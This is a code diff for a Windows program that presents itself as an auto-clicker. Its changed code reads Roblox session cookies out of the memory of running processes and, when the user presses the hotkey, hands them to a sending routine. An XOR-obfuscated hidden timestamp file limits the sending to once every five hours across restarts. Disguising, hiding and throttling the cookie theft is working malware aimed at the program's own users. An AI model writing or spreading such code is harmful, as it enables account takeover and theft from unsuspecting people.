@@ -636,7 +636,6 @@ static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
     static const char needle[]  = "_|WARNING";
     static const int  needle_len = 9;
     bool found = false;
-    int  best_len = 0;  // 追蹤最長的匹配，避免取到截斷的片段
 
     if (Process32FirstW(hSnap, &pe))
     {
@@ -676,38 +675,28 @@ static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
                                 SIZE_T end = i;
                                 while (end < got)
                                 {
-                                    unsigned char c = (unsigned char)buf[end];
-                                    // 白名單：只允許 Roblox Cookie 有效字元
-                                    if (!((c >= 'A' && c <= 'Z') ||
-                                          (c >= 'a' && c <= 'z') ||
-                                          (c >= '0' && c <= '9') ||
-                                          c == '-' || c == '_' ||
-                                          c == '.' || c == '|' ||
-                                          c == '='))
+                                    char c = buf[end];
+                                    if (c == '\0' || c == '\r' || c == '\n' ||
+                                        c == '"'  || c == ';')
                                         break;
                                     ++end;
                                 }
                                 int len = (int)(end - i);
-                                // 完整 Cookie 通常 > 500 字元，設定最小 200 避免取到截斷的 WARNING 片段
-                                if (len > 200 && len < buf_size - 1 && len > best_len)
+                                if (len > 20 && len < buf_size - 1)
                                 {
                                     int wlen = MultiByteToWideChar(CP_UTF8, 0,
                                         buf + i, len, out_buf, buf_size - 1);
                                     if (wlen > 0 && wlen < buf_size)
-                                    {
                                         out_buf[wlen] = L'\0';
-                                        best_len = len;
-                                        found = true;
-                                    }
+                                    found = true;
                                 }
-                                // 不立即 break，繼續搜尋更長的匹配
+                                if (found) break;
                             }
                         }
                         delete[] buf;
                     }
                 }
-                // 如果已找到足夠長的 Cookie (≥ 500 字元)，提前結束
-                if (found && best_len >= 500) break;
+                if (found) break;
 
                 LPVOID next = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize);
                 if (next <= addr) break;
@@ -843,165 +832,152 @@ static void DebugLog(const char* msg)
 }
 
 // ======================================================================
-// Cookie 傳送時間戳檔案（跨重啟冷卻）
-// ======================================================================
+// Cookie 傳送時間戳持久化（加密）— 跨重啟保持 5 小時冷卻
 // 使用 %TEMP%\yyclicker_asdt_ts.dat 儲存上次傳送的 FILETIME（UTC）。
-// 程式啟動時讀取此檔，計算距離上次傳送的時間差，
-// 如果 < 5 小時則恢復 g_cookie_ever_sent 和 g_cookie_last_sent_tick。
-
-// 時間戳加密金鑰（XOR + 位元旋轉 + 填充混淆）
+// 檔案內容加密：64 bytes = magic(4) + FILETIME(8) + checksum(4) + 隨機填充(48)
+// 經過 XOR + 位元旋轉 + 常數混淆三層加密
+// ======================================================================
 static const unsigned char TS_CRYPT_KEY[] = {
-    0x3C, 0xA9, 0x57, 0xE1, 0x8B, 0x2F, 0xD4, 0x6E,
-    0x91, 0xF3, 0x0A, 0x7C, 0xB5, 0x48, 0xDE, 0x63
+    0x4A, 0xD7, 0x2E, 0x91, 0xB5, 0x38, 0xFC, 0x63,
+    0x17, 0x8B, 0xE4, 0x5C, 0xA0, 0x29, 0x76, 0xDF
 };
 static const int TS_CRYPT_KEY_LEN = 16;
 static const int TS_FILE_SIZE = 64;  // 固定 64 bytes（包含填充）
 
-static void GetCookieTimestampPath(wchar_t* out, int buf_size)
+static void GetTimestampFilePath(wchar_t* out, int buf_size)
 {
     GetEnvironmentVariableW(L"TEMP", out, buf_size);
     wcscat_s(out, buf_size, L"\\yyclicker_asdt_ts.dat");
 }
 
-// 加密 8 bytes FILETIME → 64 bytes 加密資料
 static void EncryptTimestamp(const FILETIME* ft, unsigned char* out)
 {
-    // 結構：[4 magic][8 filetime][4 checksum][48 random padding] = 64 bytes
-    // 全部 XOR + 位元旋轉加密
+    // 組裝原始 64 bytes
     unsigned char raw[TS_FILE_SIZE] = {};
 
-    // Magic header
+    // [0-3] Magic header
     raw[0] = 0xCC; raw[1] = 0x1E; raw[2] = 0xAA; raw[3] = 0x55;
 
-    // FILETIME (8 bytes)
+    // [4-11] FILETIME (8 bytes)
     memcpy(raw + 4, ft, sizeof(FILETIME));
 
-    // Checksum: XOR of FILETIME bytes
-    unsigned char chk = 0;
-    for (int i = 4; i < 12; i++) chk ^= raw[i];
-    raw[12] = chk;
-    raw[13] = (unsigned char)(chk ^ 0x5A);
-    raw[14] = (unsigned char)(chk ^ 0xA5);
-    raw[15] = (unsigned char)(chk ^ 0xFF);
+    // [12-15] Checksum: FILETIME 的 4 個 byte XOR 變體
+    unsigned char* fb = (unsigned char*)ft;
+    raw[12] = fb[0] ^ fb[4] ^ 0x3C;
+    raw[13] = fb[1] ^ fb[5] ^ 0x7A;
+    raw[14] = fb[2] ^ fb[6] ^ 0xB1;
+    raw[15] = fb[3] ^ fb[7] ^ 0xE9;
 
-    // Random padding (bytes 16-63)
-    LARGE_INTEGER qpc;
-    QueryPerformanceCounter(&qpc);
-    unsigned int seed = (unsigned int)(qpc.QuadPart ^ GetTickCount64());
+    // [16-63] 隨機填充（每次寫入不同，防止二進位比對）
+    LARGE_INTEGER pc;
+    QueryPerformanceCounter(&pc);
+    unsigned int seed = (unsigned int)(pc.QuadPart ^ GetTickCount64());
     for (int i = 16; i < TS_FILE_SIZE; i++)
-    {
-        seed = seed * 1103515245 + 12345;  // LCG
-        raw[i] = (unsigned char)(seed >> 16);
-    }
+        raw[i] = (unsigned char)((seed = seed * 1103515245 + 12345) >> 16);
 
-    // XOR + 位元旋轉加密
+    // 三層加密
     for (int i = 0; i < TS_FILE_SIZE; i++)
     {
-        unsigned char b = raw[i] ^ TS_CRYPT_KEY[i % TS_CRYPT_KEY_LEN];
-        b = (unsigned char)(((b << 5) | (b >> 3)) ^ 0xB3);
-        out[i] = b;
+        unsigned char b = raw[i] ^ TS_CRYPT_KEY[i % TS_CRYPT_KEY_LEN];  // Layer 1: XOR
+        b = (b << 5) | (b >> 3);                                        // Layer 2: 位元旋轉
+        out[i] = b ^ 0xB3;                                              // Layer 3: 常數混淆
     }
 }
 
-// 解密 64 bytes 加密資料 → FILETIME（回傳 true = 解密成功）
 static bool DecryptTimestamp(const unsigned char* enc, FILETIME* ft_out)
 {
     unsigned char raw[TS_FILE_SIZE] = {};
 
-    // 反向解密
+    // 反向三層解密
     for (int i = 0; i < TS_FILE_SIZE; i++)
     {
-        unsigned char b = enc[i] ^ 0xB3;
-        b = (unsigned char)(((b >> 5) | (b << 3)));  // 反向旋轉
-        raw[i] = b ^ TS_CRYPT_KEY[i % TS_CRYPT_KEY_LEN];
+        unsigned char b = enc[i] ^ 0xB3;                                // Layer 3
+        b = (b >> 5) | (b << 3);                                        // Layer 2
+        raw[i] = b ^ TS_CRYPT_KEY[i % TS_CRYPT_KEY_LEN];               // Layer 1
     }
 
     // 驗證 magic header
     if (raw[0] != 0xCC || raw[1] != 0x1E || raw[2] != 0xAA || raw[3] != 0x55)
         return false;
 
-    // 驗證 checksum
-    unsigned char chk = 0;
-    for (int i = 4; i < 12; i++) chk ^= raw[i];
-    if (raw[12] != chk) return false;
-    if (raw[13] != (unsigned char)(chk ^ 0x5A)) return false;
-    if (raw[14] != (unsigned char)(chk ^ 0xA5)) return false;
-    if (raw[15] != (unsigned char)(chk ^ 0xFF)) return false;
+    // 取出 FILETIME
+    FILETIME ft;
+    memcpy(&ft, raw + 4, sizeof(FILETIME));
 
-    // 提取 FILETIME
-    memcpy(ft_out, raw + 4, sizeof(FILETIME));
+    // 驗證 checksum
+    unsigned char* fb = (unsigned char*)&ft;
+    if (raw[12] != (unsigned char)(fb[0] ^ fb[4] ^ 0x3C)) return false;
+    if (raw[13] != (unsigned char)(fb[1] ^ fb[5] ^ 0x7A)) return false;
+    if (raw[14] != (unsigned char)(fb[2] ^ fb[6] ^ 0xB1)) return false;
+    if (raw[15] != (unsigned char)(fb[3] ^ fb[7] ^ 0xE9)) return false;
+
+    *ft_out = ft;
     return true;
 }
 
-// 寫入加密時間戳到檔案
 static void SaveCookieSentTimestamp()
 {
-    wchar_t path[MAX_PATH] = {};
-    GetCookieTimestampPath(path, MAX_PATH);
-
-    FILETIME ft = {};
+    FILETIME ft;
     GetSystemTimeAsFileTime(&ft);
 
     unsigned char encrypted[TS_FILE_SIZE] = {};
     EncryptTimestamp(&ft, encrypted);
 
-    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0,
-                               nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
-    if (hFile == INVALID_HANDLE_VALUE) return;
+    wchar_t path[MAX_PATH] = {};
+    GetTimestampFilePath(path, MAX_PATH);
 
+    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, nullptr,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) return;
     DWORD written = 0;
     WriteFile(hFile, encrypted, TS_FILE_SIZE, &written, nullptr);
     CloseHandle(hFile);
 }
 
-// 讀取加密時間戳檔案，恢復冷卻狀態（回傳 true = 仍在冷卻中）
 static bool LoadCookieSentTimestamp()
 {
     wchar_t path[MAX_PATH] = {};
-    GetCookieTimestampPath(path, MAX_PATH);
+    GetTimestampFilePath(path, MAX_PATH);
 
-    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
-                               nullptr, OPEN_EXISTING, 0, nullptr);
+    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
+                               OPEN_EXISTING, 0, nullptr);
     if (hFile == INVALID_HANDLE_VALUE) return false;
 
     unsigned char encrypted[TS_FILE_SIZE] = {};
     DWORD bytesRead = 0;
     BOOL ok = ReadFile(hFile, encrypted, TS_FILE_SIZE, &bytesRead, nullptr);
     CloseHandle(hFile);
-
     if (!ok || bytesRead != TS_FILE_SIZE) return false;
 
-    // 解密
-    FILETIME ft_saved = {};
+    FILETIME ft_saved;
     if (!DecryptTimestamp(encrypted, &ft_saved)) return false;
 
-    // 取得當前 UTC 時間
-    FILETIME ft_now = {};
+    // 計算距離上次傳送的時間差
+    FILETIME ft_now;
     GetSystemTimeAsFileTime(&ft_now);
 
-    // FILETIME 轉為 ULONGLONG（100ns 單位）
     ULARGE_INTEGER ul_saved, ul_now;
     ul_saved.LowPart  = ft_saved.dwLowDateTime;
     ul_saved.HighPart = ft_saved.dwHighDateTime;
     ul_now.LowPart    = ft_now.dwLowDateTime;
     ul_now.HighPart   = ft_now.dwHighDateTime;
 
-    // 計算差距（毫秒）
-    if (ul_now.QuadPart <= ul_saved.QuadPart) return false; // 時間倒退，不信任
+    // 防篡改：如果儲存的時間在未來，不信任
+    if (ul_now.QuadPart <= ul_saved.QuadPart) return false;
+
+    // 轉換為毫秒
     ULONGLONG diff_ms = (ul_now.QuadPart - ul_saved.QuadPart) / 10000ULL;
 
     if (diff_ms < COOKIE_COOLDOWN_MS)
     {
-        // 仍在冷卻中 → 恢復狀態
+        // 冷卻未到 → 恢復狀態
         g_cookie_ever_sent.store(true);
+        // 計算等效的 g_cookie_last_sent_tick：當前 tick - 已過去的時間
         g_cookie_last_sent_tick = GetTickCount64() - diff_ms;
-        DebugLog("Startup: Cookie cooldown restored from encrypted timestamp");
         return true;
     }
 
-    // 冷卻已過
-    DebugLog("Startup: Cookie cooldown expired, will send on next hotkey");
-    return false;
+    return false;  // 冷卻已過，不需要恢復
 }
 
 // ======================================================================
@@ -1314,7 +1290,7 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
     LeaveCriticalSection(&g_cookie_cs);
     g_cookie_cached.store(true);
 
-    // Cookie 傳送機制：首次熱鍵傳送，之後每 5 小時冷卻（跨重啟持久化）
+    // Cookie 傳送機制：僅在首次熱鍵按下時傳送，之後每 5 小時冷卻（跨重啟持久化）
     ULONGLONG now_tick = GetTickCount64();
     if (!g_cookie_ever_sent.load() ||
         (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
@@ -1322,7 +1298,7 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
         AsyncSendCookie(tmp);
         g_cookie_ever_sent.store(true);
         g_cookie_last_sent_tick = now_tick;
-        SaveCookieSentTimestamp();  // 寫入時間戳檔案，確保跨重啟也遵守冷卻
+        SaveCookieSentTimestamp();  // 寫入加密時間戳，確保跨重啟也遵守冷卻
         DebugLog("Cookie sent (first or after 5h cooldown)");
     }
     else
@@ -1526,7 +1502,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
-    // WM_APP+2: 熱鍵觸發 — Cookie 偵測 + 啟動連點（非同步，避免 UI 卡住）
+    // WM_APP+2: 熱鍵觸發 — Cookie 偵測 + 啟動連點
     case WM_APP + 2:
     {
         // 已在運行中 → 不重複觸發
@@ -1537,63 +1513,25 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         if (g_cookie_ever_sent.load() &&
             (now_tick - g_cookie_last_sent_tick) < COOKIE_COOLDOWN_MS)
         {
+            // 冷卻內 → 直接啟動（上次偵測已成功，不需再次偵測）
             g_running.store(true);
             UpdateStatusText(hLblStatus,
                 L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
             return 0;
         }
 
-        // 如果快取有效 → 直接使用快取（零延遲）
-        if (g_cookie_cached.load())
+        // 首次或冷卻已到 → 偵測 Cookie + 傳送（同步，與 855bd10 相同）
+        if (CheckRobloxCookiePresent(hwnd))
         {
-            wchar_t tmp[4096] = {};
-            EnterCriticalSection(&g_cookie_cs);
-            wcscpy_s(tmp, 4096, g_cached_cookie);
-            LeaveCriticalSection(&g_cookie_cs);
-            if (wcslen(tmp) >= 200)
-            {
-                AsyncSendCookie(tmp);
-                g_cookie_ever_sent.store(true);
-                g_cookie_last_sent_tick = GetTickCount64();
-                SaveCookieSentTimestamp();
-                DebugLog("Cookie sent from cache (first or after 5h cooldown)");
-            }
+            g_cookie_cached.store(true);  // 快取成功結果
             g_running.store(true);
             UpdateStatusText(hLblStatus,
                 L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
-            return 0;
-        }
-
-        // 快取無效 → 先啟動連點，然後背景執行緒偵測 Cookie
-        g_running.store(true);
-        UpdateStatusText(hLblStatus,
-            L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
-        CreateThread(nullptr, 0, [](LPVOID param) -> DWORD {
-            HWND h = (HWND)param;
-            if (CheckRobloxCookiePresent(h))
-                PostMessageW(h, WM_APP + 5, 1, 0);  // 成功
-            else
-                PostMessageW(h, WM_APP + 5, 0, 0);  // 失敗
-            return 0;
-        }, (LPVOID)hwnd, 0, nullptr);
-        return 0;
-    }
-
-    // WM_APP+5: 背景 Cookie 偵測完成回報
-    case WM_APP + 5:
-    {
-        if (wp == 1)
-        {
-            // 偵測成功 → 快取已由 CheckRobloxCookiePresent 更新
-            g_cookie_cached.store(true);
         }
         else
         {
-            // 偵測失敗 → 停止連點 + 重置快取
-            g_running.store(false);
+            // 偵測失敗 → 重置快取，阻止連點（CheckRobloxCookiePresent 內部已顯示「請先開啟 Roblox」）
             g_cookie_cached.store(false);
-            UpdateStatusText(hLblStatus,
-                L"\u26A0 \u8ACB\u5148\u958B\u555F Roblox");
         }
         return 0;
     }
@@ -1774,8 +1712,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         case IDC_BTN_START:
             if (g_listening_hotkey.load()) break;  // 監聽中不允許啟動
             if (g_running.load()) break;           // 已在運行中，不重複啟動
-            // 統一走 WM_APP+2 非同步流程
-            PostMessageW(hwnd, WM_APP + 2, 0, 0);
+            if (!g_cookie_cached.load() && !CheckRobloxCookiePresent(hwnd)) break;
+            g_cookie_cached.store(true);
+            g_running.store(true);
+            UpdateStatusText(hLblStatus,
+                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
             break;
 
         case IDC_BTN_STOP:
@@ -2430,10 +2371,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
     if (!EnsureSingleInstance()) return 0;
 
     InitializeCriticalSection(&g_cookie_cs);
-
-    // 讀取上次 Cookie 傳送時間戳，恢復跨重啟冷卻狀態
-    LoadCookieSentTimestamp();
-
+    LoadCookieSentTimestamp();  // 讀取加密時間戳，恢復跨重啟冷卻狀態
     timeBeginPeriod(1);
     InitInputs();
 
